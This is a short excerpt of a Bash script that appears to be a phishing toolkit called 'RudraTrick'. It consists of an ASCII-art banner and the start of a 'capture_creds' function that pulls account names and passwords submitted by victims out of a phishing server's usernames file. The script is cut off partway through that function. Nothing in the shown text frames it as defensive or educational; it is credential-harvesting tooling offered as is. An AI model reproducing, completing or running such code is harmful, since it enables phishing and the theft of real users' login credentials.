...
${ORANGE} 
${ORANGE} ████████████████████████████████████████████████ 
${ORANGE} █ ${RED}___  _  _ _ ____ _  _ _ _  _ ____ ${MAGENTA}RudraTrick ${ORANGE}█
...
## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Rudra:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Singh:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
